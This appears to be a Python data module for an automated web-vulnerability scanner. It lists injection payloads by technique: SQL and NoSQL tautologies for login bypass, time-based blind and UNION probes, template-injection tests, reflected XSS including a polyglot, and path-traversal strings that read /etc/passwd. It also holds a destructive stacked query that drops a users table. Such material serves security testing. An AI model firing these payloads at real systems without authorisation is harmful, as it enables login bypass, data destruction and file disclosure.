"""Technique-category payload definitions.

Organized by *technique category* (comment-terminator breakout, tautology
injection, boolean-differential, time-based blind, etc.) rather than by
specific SQL dialect or hardcoded bypass string. Each category contains
variants across multiple dialects (SQL, NoSQL, template injection).

This data structure replaces hardcoded bypass-string lists. The Strategist
and payload generator select *which categories* to fire based on field context
and tech-stack fingerprinting, with dialect variants chosen by relevance.

The detection of whether a payload succeeded is handled separately by
Phase 2's outcome-detection engine (auth artifacts, status-flip, differential
responses, timing anomalies, broadened error signatures).
"""

from __future__ import annotations

from typing import Any

# Technique categories with dialect variants.
# Each category has a `variants` dict keyed by target type ("sql", "nosql",
# "template") containing either a list of string payloads or a dict with
# "true"/"false" keys for paired differential techniques.

TECHNIQUE_CATEGORIES: dict[str, dict[str, Any]] = {
    "comment_terminator": {
        "description": "Break out of string context with comment terminator",
        "variants": {
            "sql": ["'--", "' #", "' /*", "' /*comment*/"],
            "nosql": ['"--', '" //'],
            "template": ["{{", "${", "[%"],
        },
    },
    "tautology": {
        "description": "Inject always-true condition for auth bypass or boolean blind",
        "variants": {
            "sql": [
                "' OR 1=1--",
                "' OR '1'='1'--",
                "admin'--",
                "' OR 'x'='x",
                "' OR 1=1 #",
            ],
            "nosql": [
                '{"$ne": null}',
                '{"$gt": ""}',
                '"$where": "1==1"',
            ],
            "template": [
                "{{7*7}}",
                "${7*7}",
                "[% 7*7 %]",
            ],
        },
    },
    "boolean_differential": {
        "description": "Paired true/false condition for differential response detection",
        "variants": {
            "sql": {
                "true": ["' AND 1=1--", "1 AND 1=1--"],
                "false": ["' AND 1=2--", "1 AND 1=2--"],
            },
            "nosql": {
                "true": ['{"field": {"$ne": null}}', '{"field": {"$gt": ""}}'],
                "false": ['{"field": {"$ne": ""}}', '{"field": {"$eq": ""}}'],
            },
            "template": {
                "true": ["{{7*7}}", "${7*7}"],
                "false": ["{{1/0}}", "${1/0}"],
            },
        },
    },
    "time_based_blind": {
        "description": "Inject delay to detect blind execution via timing anomaly",
        "variants": {
            "sql": [
                ("SLEEP(5)--", "mysql"),                  # MySQL
                ("BENCHMARK(10000000,SHA1('x'))--", "mysql"),  # MySQL
                ("WAITFOR DELAY '0:0:5'--", "mssql"),     # SQL Server
                ("'; SELECT pg_sleep(5)--", "postgres"),  # PostgreSQL (statement-terminated)
                ("' || pg_sleep(5)--", "postgres"),       # PostgreSQL (string-context)
                ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", "postgres"),  # PG boolean-gated
            ],
            "nosql": [
                '{"$where": "sleep(5000)"}',
            ],
            "template": [
                "{{7*7*7*7*7*7*7*7*7*7*7*7*7*7*7*7}}",
            ],
        },
    },
    "union_based": {
        "description": "UNION-based data extraction attempt",
        "variants": {
            "sql": [
                "' UNION SELECT null--",
                "' UNION SELECT null,null--",
                "' UNION SELECT null,null,null--",
            ],
            "nosql": [],
            "template": [],
        },
    },
    "stacked_query": {
        "description": "Stack additional SQL statements after a terminator",
        "variants": {
            "sql": [
                "'; DROP TABLE users--",
                "'; SELECT * FROM information_schema--",
            ],
            "nosql": [],
            "template": [],
        },
    },
    "xss_reflected": {
        "description": "Reflected XSS payloads designed to execute or be visibly unescaped in HTML context",
        "dialect_agnostic": True,
        "variants": {
            "html_context": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
            ],
            "attribute_breakout": [
                '"><script>alert(1)</script>',
                "' onmouseover='alert(1)",
                '" autofocus onfocus=alert(1) x="',
            ],
            "javascript_uri": [
                "javascript:alert(1)",
                "javascript:alert(document.domain)",
            ],
            "encoded": [
                "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
                "&#60;script&#62;alert(1)&#60;/script&#62;",
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",  # JSON unicode escape
            ],
            "polyglot": [
                "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            ],
        },
    },
    "html_injection": {
        "description": "Non-scripting markup injection — detects missing output encoding",
        "dialect_agnostic": True,
        "variants": {
            "structural": [
                "<h1>INJECTED</h1>",
                '<img src="x">',
                "<hr>",
                "<iframe src=about:blank></iframe>",
            ],
        },
    },
    "path_traversal": {
        "description": "File path traversal to read arbitrary files or expose source code",
        "dialect_agnostic": True,
        "variants": {
            "generic": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",          # filter-bypass (strip-one-pass)
                "..%2f..%2f..%2fetc%2fpasswd",            # single URL-encoded
                "..%252f..%252f..%252fetc%252fpasswd",    # double URL-encoded
                "/etc/passwd%00",                          # null-byte truncation (legacy PHP)
                "..\\..\\..\\windows\\win.ini",
                "..%5c..%5c..%5cwindows%5cwin.ini",
                "php://filter/convert.base64-encode/resource=index.php",  # PHP-specific
                "file:///etc/passwd",
            ],
        },
    },
}

# Map technique category to parameter locations where it's most effective
CATEGORY_TARGET_LOCATIONS: dict[str, list[str]] = {
    "comment_terminator": ["body_json", "query", "body_form", "header"],
    "tautology": ["body_json", "query", "body_form", "header"],
    "boolean_differential": ["body_json", "query", "body_form", "header"],
    "time_based_blind": ["body_json", "query", "body_form", "header"],
    "union_based": ["body_json", "query"],
    "stacked_query": ["body_json", "query"],
    "xss_reflected": ["body_json", "query", "body_form", "header", "cookie"],
    "html_injection": ["body_json", "query", "body_form", "header", "cookie"],
    "path_traversal": ["query", "body_form", "header"],  # file paths in params
}

# Categories that are most relevant for auth-endpoint credential fields
AUTH_PRIORITY_CATEGORIES: tuple[str, ...] = ("tautology", "boolean_differential")
